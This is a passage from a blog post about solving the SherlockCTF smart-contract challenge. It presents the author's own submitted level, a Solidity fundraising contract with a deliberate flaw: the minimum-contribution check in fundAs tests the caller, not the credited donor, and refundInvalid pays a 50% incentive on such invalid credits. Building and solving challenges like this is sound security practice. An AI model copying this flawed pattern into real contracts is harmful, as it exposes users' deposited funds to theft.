
<!DOCTYPE html>
<html lang="en" data-figures="" class="page" data-mode="dim">
  <head>
<title>Solving SherlockCTF | tqts.ar</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-HFZFM2N29W"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-HFZFM2N29W');
</script>

<meta property="og:locale" content="en" />

<meta property="og:type" content="article">
<meta name="description" content="SherlockCTF was a collaborative CTF organized by Sherlock and Secureum, for the top 32 participants in february&#39;s RACE event. Each participant submitted a CTF …">
<meta name="twitter:card" content="summary" />
<meta name="twitter:creator" content="">
<meta name="twitter:title" content="Solving SherlockCTF" />
<meta property="og:url" content="https://tqts.ar/post/solving-sherlockctf/" />
<meta property="og:title" content="Solving SherlockCTF" />
<meta property="og:description" content="SherlockCTF was a collaborative CTF organized by Sherlock and Secureum, for the top 32 participants in february&#39;s RACE event. Each participant submitted a CTF …" />
<meta property="og:image" content="https://tqts.ar/images/thumbnail.png" />

<link rel="apple-touch-icon" sizes="180x180" href="https://tqts.ar/icons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://tqts.ar/icons/favicon-32x32.png">
<link rel="manifest" href="https://tqts.ar/icons/site.webmanifest">

<link rel="canonical" href="https://tqts.ar/post/solving-sherlockctf/">

    

    
    
    <link rel="preload" href="https://tqts.ar/css/styles.75d793ff9f1e090e07d6a6cf44af247593771bca925b6dc314709dc3c182c3174fd9691c42ea2128f9e95746557fc6918b2f7990cfcf6d34c56a7806d9b6a2da.css" integrity = "sha512-ddeT/58eCQ4H1qbPRK8kdZN3G8qSW23DFHCdw8GCwxdP2WkcQuohKPnpV0ZVf8aRiy95kM/PbTTFangG2bai2g==" as="style" crossorigin="anonymous">
    <link rel="preload" href="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" as="script" integrity=
    "sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous">

    
    <link rel="stylesheet" type="text/css" href="https://tqts.ar/css/styles.75d793ff9f1e090e07d6a6cf44af247593771bca925b6dc314709dc3c182c3174fd9691c42ea2128f9e95746557fc6918b2f7990cfcf6d34c56a7806d9b6a2da.css" integrity="sha512-ddeT/58eCQ4H1qbPRK8kdZN3G8qSW23DFHCdw8GCwxdP2WkcQuohKPnpV0ZVf8aRiy95kM/PbTTFangG2bai2g==" crossorigin="anonymous">
    
  </head>
  
  
  
    
  
  <body data-code="25" data-lines="true" id="documentTop">


<header class="nav_header" >
  <nav class="nav"><a href='https://tqts.ar/' class="nav_brand nav_item" title="tqts.ar">
  <img src="https://tqts.ar/logos/logo.png" class="logo" alt="tqts.ar">
  <div class="nav_close">
    <div><svg class="icon">
  <use xlink:href="#open-menu"></use>
</svg><svg class="icon">
  <use xlink:href="#closeme"></use>
</svg></div>
  </div>
</a>

    <div class='nav_body nav_body_left'>
      
      
      
        

  <div class="nav_parent">
    <a href="https://tqts.ar/" class="nav_item" title="Home">Home </a>
  </div>
  <div class="nav_parent">
    <a href="https://tqts.ar/posts/" class="nav_item" title="Archives">Archives </a>
  </div>
  <div class="nav_parent">
    <a href="https://tqts.ar/about/" class="nav_item" title="About">About </a>
  </div>
      
<div class='follow'>
  <a href="https://github.com/tqtsar">
    <svg class="icon">
  <use xlink:href="#github"></use>
</svg>
  </a>
    
  <a href="https://tqts.ar/index.xml">
    <svg class="icon">
  <use xlink:href="#rss"></use>
</svg>
  </a>
<div class="color_mode">
  <input type="checkbox" class="color_choice" id="mode">
</div>

</div>

    </div>
  </nav>
</header>

    <main>
  
<div class="grid-inverse wrap content">
  <article class="post_content">
    <h1 class="post_title">Solving SherlockCTF</h1>
  <div class="post_meta">
    <span><svg class="icon">
  <use xlink:href="#calendar"></use>
</svg></span>
    <span class="post_date">
      Feb 25, 2022</span>
    <span class="post_time"> · 28 min read</span><span>&nbsp;· <a href='https://tqts.ar/tags/remix' title="Remix" class="post_tag button button_translucent">Remix
        </a><a href='https://tqts.ar/tags/solidity' title="Solidity" class="post_tag button button_translucent">Solidity
        </a><a href='https://tqts.ar/tags/hardhat' title="Hardhat" class="post_tag button button_translucent">Hardhat
        </a>
    </span>
    <span class="page_only">&nbsp;·
  <div class="post_share">
    Share on:
    <a href="https://twitter.com/intent/tweet?text=Solving%20SherlockCTF&url=https%3a%2f%2ftqts.ar%2fpost%2fsolving-sherlockctf%2f&tw_p=tweetbutton" class="twitter" title="Share on Twitter" target="_blank" rel="nofollow">
      <svg class="icon">
  <use xlink:href="#twitter"></use>
</svg>
    </a>
    <a href="https://www.facebook.com/sharer.php?u=https%3a%2f%2ftqts.ar%2fpost%2fsolving-sherlockctf%2f&t=Solving%20SherlockCTF" class="facebook" title="Share on Facebook" target="_blank" rel="nofollow">
      <svg class="icon">
  <use xlink:href="#facebook"></use>
</svg>
    </a>
    <a href="#linkedinshare" id = "linkedinshare" class="linkedin" title="Share on LinkedIn" rel="nofollow">
      <svg class="icon">
  <use xlink:href="#linkedin"></use>
</svg>
    </a>
    <a href="https://tqts.ar/post/solving-sherlockctf/" title="Copy Link" class="link link_yank">
      <svg class="icon">
  <use xlink:href="#copy"></use>
</svg>
    </a>
  </div>
  </span>
  </div>




    
    <div class="post_toc">
      <h2>Overview</h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#my-submission">My submission</a></li>
    <li><a href="#solved-levels">Solved levels</a>
      <ul>
        <li><a href="#0xmoostorm---collision-exchange">0xmoostorm - Collision Exchange</a></li>
        <li><a href="#baraa42---casino">Baraa42 - Casino</a></li>
        <li><a href="#bowtiedpickle---padlock">BowTiedPickle - Padlock</a></li>
        <li><a href="#justdravee---sheerlocking">JustDravee - SheerLocking</a></li>
        <li><a href="#peterisprieditis---stableswap2">PeterisPrieditis - StableSwap2</a></li>
        <li><a href="#thro77le---challenge">Thro77le - Challenge</a></li>
        <li><a href="#agusduha---thekingisdeadlonglivetheking">agusduha - TheKingIsDeadLongLiveTheKing</a></li>
        <li><a href="#bahurum---inflation">bahurum - Inflation</a></li>
        <li><a href="#band0x---becomemaster">band0x - BecomeMaster</a></li>
        <li><a href="#chaboo---swisstreasury">chaboo - SwissTreasury</a></li>
        <li><a href="#ebaizel---pixelpavel">ebaizel - PixelPavel</a></li>
        <li><a href="#hack3r-0m---bitmania">hack3r-0m - BitMania</a></li>
        <li><a href="#iflp---examplequizexploit-default-name-for-the-template">iflp - ExampleQuizExploit (default name for the template)</a></li>
        <li><a href="#johngish---challenge">johngish - Challenge</a></li>
        <li><a href="#kankan-0---dead">kankan-0 - Dead</a></li>
        <li><a href="#kuldeep23907---challenge">kuldeep23907 - Challenge</a></li>
        <li><a href="#mhchia---crowdfunding">mhchia - CrowdFunding</a></li>
        <li><a href="#naps62---builtbyanoob">naps62 - BuiltByANoob</a></li>
        <li><a href="#saianmk---combination">saianmk - Combination</a></li>
        <li><a href="#sidduhere---examplequizexploit-default-name-for-the-template">sidduHERE - ExampleQuizExploit (default name for the template)</a></li>
        <li><a href="#smbsp---collectreward">smbsp - CollectReward</a></li>
        <li><a href="#t-nero---monopoly">t-nero - Monopoly</a></li>
        <li><a href="#teryanarmen---challenge2">teryanarmen - Challenge2</a></li>
        <li><a href="#ych18---funnychallenges">ych18 - FunnyChallenges</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
    
    <div class="post_body"><p>SherlockCTF was a collaborative CTF organized by <a href="https://sherlock.xyz">Sherlock</a> and <a href="https://secureum.xyz">Secureum</a>, for the top 32 participants in february's RACE event. Each participant submitted a CTF level, and for 7 days, the competition was opened. I managed to score 32 points.</p>
<p>This was a great experience overall, I could learn a lot of new concepts and vulnerabilities, but the most important thing: it was fun and I enjoyed it every minute. Big thanks to Rajeev and the Sherlock team!</p>
<style type="text/css">.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:#444;background:#e7f2fa}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:#fff;background:#6ab0de}.notice.warning .notice-title{background:rgba(217,83,79,.9)}.notice.warning{background:#fae2e2}.notice.info .notice-title{background:#f0b37e}.notice.info{background:#fff2db}.notice.note .notice-title{background:#6ab0de}.notice.note{background:#e7f2fA}.notice.tip .notice-title{background:rgba(92,184,92,.8)}.notice.tip{background:#e6f9e6}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:0.125em;position:relative}</style>
<div><svg width="0" height="0" display="none" xmlns="http://www.w3.org/2000/svg"><symbol id="tip-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.967-111.033 248-248 248S8 392.967 8 256 119.033 8 256 8s248 111.033 248 248zM227.314 387.314l184-184c6.248-6.248 6.248-16.379 0-22.627l-22.627-22.627c-6.248-6.249-16.379-6.249-22.628 0L216 308.118l-70.059-70.059c-6.248-6.248-16.379-6.248-22.628 0l-22.627 22.627c-6.248 6.248-6.248 16.379 0 22.627l104 104c6.249 6.249 16.379 6.249 22.628.001z"/></symbol><symbol id="note-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="warning-notice" viewBox="0 0 576 512" preserveAspectRatio="xMidYMid meet"><path d="M569.517 440.013C587.975 472.007 564.806 512 527.94 512H48.054c-36.937 0-59.999-40.055-41.577-71.987L246.423 23.985c18.467-32.009 64.72-31.951 83.154 0l239.94 416.028zM288 354c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z"/></symbol><symbol id="info-notice" viewBox="0 0 512 512" preserveAspectRatio="xMidYMid meet"><path d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 110c23.196 0 42 18.804 42 42s-18.804 42-42 42-42-18.804-42-42 18.804-42 42-42zm56 254c0 6.627-5.373 12-12 12h-88c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h12v-64h-12c-6.627 0-12-5.373-12-12v-24c0-6.627 5.373-12 12-12h64c6.627 0 12 5.373 12 12v100h12c6.627 0 12 5.373 12 12v24z"/></symbol></svg></div><div class="notice info" >
<p class="first notice-title"><span class="icon-notice baseline"><svg><use href="#info-notice"></use></svg></span>Info</p><p>The complete code for these solutions is at my <a href="https://github.com/tqtsar/sherlockctf-solutions">sherlockctf-solutions github repo</a>.</p></div>

<hr>
<h2 id="my-submission">My submission</h2>
<hr>
<p>There were some restrictions for the submissions:</p>
<ul>
<li>Solidity version &gt;= 0.7.0, no floating Solidity versions.</li>
<li>No assembly allowed</li>
<li>No levels based on bruteforcing hashes / computational power</li>
<li>All called contracts must have been deployed by the level creator</li>
</ul>
<p>The level I created for the competition can be seen <a href="https://github.com/tqtsar/sherlockctf-solutions/tree/main/Solved/tqtsar">here</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln">  1</span><span class="c1">// SPDX-License-Identifier: GPL-3.0
</span><span class="ln">  2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">9</span><span class="p">;</span>
<span class="ln">  3</span>
<span class="ln">  4</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class="p">;</span>
<span class="ln">  5</span>
<span class="ln">  6</span><span class="cm">/*
</span><span class="ln">  7</span><span class="cm">  This fundraising has the following features:
</span><span class="ln">  8</span><span class="cm">    - Anyone can setup a fundraising, for themselves or for others
</span><span class="ln">  9</span><span class="cm">    - The beneficiary can be set only once
</span><span class="ln"> 10</span><span class="cm">    - There&#39;s a minimum contribution set by the deployer
</span><span class="ln"> 11</span><span class="cm">    - There&#39;s a target funding set by the deployer
</span><span class="ln"> 12</span><span class="cm">    - You can donate in your name, or in the name of others
</span><span class="ln"> 13</span><span class="cm">    - You can repent and get back your collaboration, for a fee
</span><span class="ln"> 14</span><span class="cm">    - The beneficiary can withdraw the funds:
</span><span class="ln"> 15</span><span class="cm">        - Anytime, if the funding goal has been met
</span><span class="ln"> 16</span><span class="cm">        - 30 days from the start of the fundraising otherwise
</span><span class="ln"> 17</span><span class="cm">    - Anyone can start the funding anytime
</span><span class="ln"> 18</span><span class="cm">    - The beneficiary can end the funding by withdrawing the funds
</span><span class="ln"> 19</span><span class="cm">*/</span>
<span class="ln"> 20</span>
<span class="ln"> 21</span><span class="kd">contract</span> <span class="nc">Fundraising</span> <span class="p">{</span>
<span class="ln"> 22</span>
<span class="ln"> 23</span>    <span class="kd">struct</span> <span class="nc">Collaboration</span> <span class="p">{</span>
<span class="ln"> 24</span>        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">;</span>
<span class="ln"> 25</span>        <span class="kt">uint256</span> <span class="nb">timestamp</span><span class="p">;</span>
<span class="ln"> 26</span>    <span class="p">}</span>
<span class="ln"> 27</span>
<span class="ln"> 28</span>    <span class="kt">uint256</span> <span class="k">immutable</span> <span class="n">_minCollab</span><span class="p">;</span>
<span class="ln"> 29</span>    <span class="kt">uint256</span> <span class="k">immutable</span> <span class="n">_targetFunds</span><span class="p">;</span>
<span class="ln"> 30</span>    <span class="kt">uint256</span> <span class="n">fundingEndDate</span><span class="p">;</span>
<span class="ln"> 31</span>    <span class="kt">bool</span> <span class="n">fundraisingOpened</span><span class="p">;</span>
<span class="ln"> 32</span>
<span class="ln"> 33</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">beneficiary</span><span class="p">;</span>
<span class="ln"> 34</span>    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="n">Collaboration</span><span class="p">)</span> <span class="k">public</span> <span class="n">collaborations</span><span class="p">;</span>
<span class="ln"> 35</span>
<span class="ln"> 36</span>
<span class="ln"> 37</span>    <span class="kd">modifier</span> <span class="nf">onlyBeneficiary</span><span class="p">()</span> <span class="p">{</span>
<span class="ln"> 38</span>        <span class="nb">require</span> <span class="p">(</span><span class="n">beneficiary</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Not the beneficiary&#34;</span><span class="p">);</span>
<span class="ln"> 39</span>        <span class="k">_</span><span class="p">;</span>
<span class="ln"> 40</span>    <span class="p">}</span>
<span class="ln"> 41</span>
<span class="ln"> 42</span>    <span class="kd">function</span> <span class="nf">getBalance</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
<span class="ln"> 43</span>        <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
<span class="ln"> 44</span>    <span class="p">}</span>
<span class="ln"> 45</span>
<span class="ln"> 46</span>    <span class="kd">constructor</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">minCollab</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">targetFunds</span><span class="p">)</span> <span class="p">{</span>
<span class="ln"> 47</span>        <span class="n">_minCollab</span> <span class="o">=</span> <span class="n">minCollab</span><span class="p">;</span>
<span class="ln"> 48</span>        <span class="n">_targetFunds</span> <span class="o">=</span> <span class="n">targetFunds</span><span class="p">;</span>
<span class="ln"> 49</span>    <span class="p">}</span>
<span class="ln"> 50</span>
<span class="ln"> 51</span>    <span class="c1">// You can make anyone the beneficiary of your fundraising,
</span><span class="ln"> 52</span><span class="c1"></span>    <span class="c1">// but you can&#39;t change it once it was set
</span><span class="ln"> 53</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">setBeneficiary</span><span class="p">(</span><span class="kt">address</span> <span class="n">newBeneficiary</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln"> 54</span>        <span class="c1">// The beneficiary can only be set once
</span><span class="ln"> 55</span><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">beneficiary</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;You can&#39;t change the beneficiary anymore&#34;</span><span class="p">);</span>
<span class="ln"> 56</span>
<span class="ln"> 57</span>        <span class="c1">// Since the beneficiary needs to retrieve the funds, it can&#39;t be a contract
</span><span class="ln"> 58</span><span class="c1"></span>        <span class="kt">bool</span> <span class="n">isContract</span> <span class="o">=</span> <span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">newBeneficiary</span><span class="p">);</span>
<span class="ln"> 59</span>        <span class="nb">require</span><span class="p">(</span><span class="n">isContract</span> <span class="o">==</span> <span class="kc">false</span><span class="p">,</span> <span class="s">&#34;The new owner is not valid.&#34;</span><span class="p">);</span>
<span class="ln"> 60</span>
<span class="ln"> 61</span>        <span class="n">beneficiary</span> <span class="o">=</span> <span class="n">newBeneficiary</span><span class="p">;</span>
<span class="ln"> 62</span>    <span class="p">}</span>
<span class="ln"> 63</span>
<span class="ln"> 64</span>    <span class="c1">// You need to start the fundraising to begin receiving funds
</span><span class="ln"> 65</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">startFundraising</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln"> 66</span>        <span class="nb">require</span><span class="p">(</span><span class="n">beneficiary</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s">&#34;Set the beneficiary first&#34;</span><span class="p">);</span>
<span class="ln"> 67</span>        <span class="n">fundingEndDate</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="mi">30</span> <span class="kc">days</span><span class="p">;</span>
<span class="ln"> 68</span>        <span class="n">fundraisingOpened</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="ln"> 69</span>    <span class="p">}</span>
<span class="ln"> 70</span>
<span class="ln"> 71</span>    <span class="c1">// Contribute to the fundraising with your own account
</span><span class="ln"> 72</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">fund</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 73</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;You have to contribute something&#34;</span><span class="p">);</span>
<span class="ln"> 74</span>        <span class="nb">require</span><span class="p">(</span><span class="n">fundraisingOpened</span><span class="p">,</span> <span class="s">&#34;The fundraising is closed&#34;</span><span class="p">);</span>
<span class="ln"> 75</span>        <span class="nb">require</span><span class="p">(</span><span class="n">checkAmount</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">),</span> <span class="s">&#34;You can&#39;t contribute less than minimum&#34;</span><span class="p">);</span>
<span class="ln"> 76</span>
<span class="ln"> 77</span>        <span class="c1">// You can fund as many times as you want, as long it&#39;s more than the minimum
</span><span class="ln"> 78</span><span class="c1"></span>        <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">amount</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
<span class="ln"> 79</span>        <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="nb">timestamp</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
<span class="ln"> 80</span>    <span class="p">}</span>
<span class="ln"> 81</span>
<span class="ln"> 82</span>    <span class="c1">// Contribute to the fundraising in the name of someone else&#39;s account
</span><span class="ln"> 83</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">fundAs</span><span class="p">(</span><span class="kt">address</span> <span class="n">donor</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
<span class="ln"> 84</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;You have to contribute something&#34;</span><span class="p">);</span>
<span class="ln"> 85</span>        <span class="nb">require</span><span class="p">(</span><span class="n">fundraisingOpened</span><span class="p">,</span> <span class="s">&#34;The fundraising is closed&#34;</span><span class="p">);</span>
<span class="ln"> 86</span>        <span class="nb">require</span><span class="p">(</span><span class="n">checkAmount</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">),</span> <span class="s">&#34;You can&#39;t contribute less than minimum&#34;</span><span class="p">);</span>
<span class="ln"> 87</span>
<span class="ln"> 88</span>        <span class="c1">// You can fund for others as many times as you want, as long it&#39;s more than the minimum
</span><span class="ln"> 89</span><span class="c1"></span>        <span class="n">collaborations</span><span class="p">[</span><span class="n">donor</span><span class="p">].</span><span class="n">amount</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
<span class="ln"> 90</span>        <span class="n">collaborations</span><span class="p">[</span><span class="n">donor</span><span class="p">].</span><span class="nb">timestamp</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
<span class="ln"> 91</span>    <span class="p">}</span>
<span class="ln"> 92</span>
<span class="ln"> 93</span>    <span class="kd">function</span> <span class="nf">checkAmount</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span> <span class="n">v</span><span class="p">){</span>
<span class="ln"> 94</span>        <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="n">amount</span> <span class="o">+</span> <span class="n">amount</span> <span class="o">&gt;=</span> <span class="n">_minCollab</span><span class="p">);</span>
<span class="ln"> 95</span>    <span class="p">}</span>
<span class="ln"> 96</span>
<span class="ln"> 97</span>
<span class="ln"> 98</span>    <span class="c1">// Withdraw your funds before the end of the fundraising.
</span><span class="ln"> 99</span><span class="c1"></span>    <span class="c1">// This means you no longer want to contribute anything to the beneficiary.
</span><span class="ln">100</span><span class="c1"></span>    <span class="c1">// However, to prevent abuse, a penalty of 10% of your contribution will be burned.
</span><span class="ln">101</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">repent</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">102</span>        <span class="nb">require</span><span class="p">(</span><span class="n">fundraisingOpened</span><span class="p">,</span> <span class="s">&#34;The fundraising is closed&#34;</span><span class="p">);</span>
<span class="ln">103</span>        <span class="nb">require</span><span class="p">(</span><span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">amount</span> <span class="o">&gt;=</span> <span class="n">_minCollab</span><span class="p">,</span> <span class="s">&#34;Your collaboration is unable to be refunded&#34;</span><span class="p">);</span>
<span class="ln">104</span>
<span class="ln">105</span>        <span class="kt">uint256</span> <span class="n">available</span> <span class="o">=</span> <span class="p">(</span><span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">amount</span> <span class="o">*</span> <span class="mi">90</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
<span class="ln">106</span>        <span class="kt">uint256</span> <span class="n">penalty</span> <span class="o">=</span> <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">amount</span> <span class="o">-</span> <span class="n">available</span><span class="p">;</span>
<span class="ln">107</span>
<span class="ln">108</span>        <span class="c1">// To prevent new repentance, set collaboration to 0
</span><span class="ln">109</span><span class="c1"></span>        <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">amount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">110</span>        <span class="n">collaborations</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="nb">timestamp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="ln">111</span>
<span class="ln">112</span>        <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">available</span><span class="p">);</span>
<span class="ln">113</span>        <span class="k">payable</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">penalty</span><span class="p">);</span>
<span class="ln">114</span>    <span class="p">}</span>
<span class="ln">115</span>
<span class="ln">116</span>    <span class="c1">// Get the results of the fundraising
</span><span class="ln">117</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">retrieveFunds</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyBeneficiary</span> <span class="p">{</span>
<span class="ln">118</span>        <span class="c1">// The beneficiary can only retrieve the funds if 30 days have passed, or if the funding target is met
</span><span class="ln">119</span><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">&gt;</span> <span class="n">fundingEndDate</span> <span class="o">||</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">_targetFunds</span><span class="p">,</span> <span class="s">&#34;The fundraising hasn&#39;t finished yet&#34;</span><span class="p">);</span>
<span class="ln">120</span>
<span class="ln">121</span>        <span class="n">fundraisingOpened</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="ln">122</span>
<span class="ln">123</span>        <span class="k">payable</span><span class="p">(</span><span class="n">beneficiary</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="p">);</span>
<span class="ln">124</span>    <span class="p">}</span>
<span class="ln">125</span>
<span class="ln">126</span>    <span class="c1">// If for some weird reason an account&#39;s contribution is invalid, anyone can send the funds back to the account
</span><span class="ln">127</span><span class="c1"></span>    <span class="c1">// The caller gets an incentive of 50% of the returned funds
</span><span class="ln">128</span><span class="c1"></span>    <span class="kd">function</span> <span class="nf">refundInvalid</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
<span class="ln">129</span>        <span class="nb">require</span><span class="p">(</span><span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="n">amount</span> <span class="o">&lt;</span> <span class="n">_minCollab</span> <span class="o">&amp;&amp;</span> <span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Not an invalid amount&#34;</span><span class="p">);</span>
<span class="ln">130</span>
<span class="ln">131</span>        <span class="c1">// Calculate refund and incentives
</span><span class="ln">132</span><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">toReturn</span> <span class="o">=</span>  <span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="n">amount</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
<span class="ln">133</span>        <span class="kt">uint256</span> <span class="n">incentive</span> <span class="o">=</span> <span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="n">amount</span> <span class="o">-</span> <span class="n">toReturn</span><span class="p">;</span>
<span class="ln">134</span>
<span class="ln">135</span>        <span class="c1">// Update internal accounting
</span><span class="ln">136</span><span class="c1"></span>        <span class="n">collaborations</span><span class="p">[</span><span class="n">user</span><span class="p">].</span><span class="n">amount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
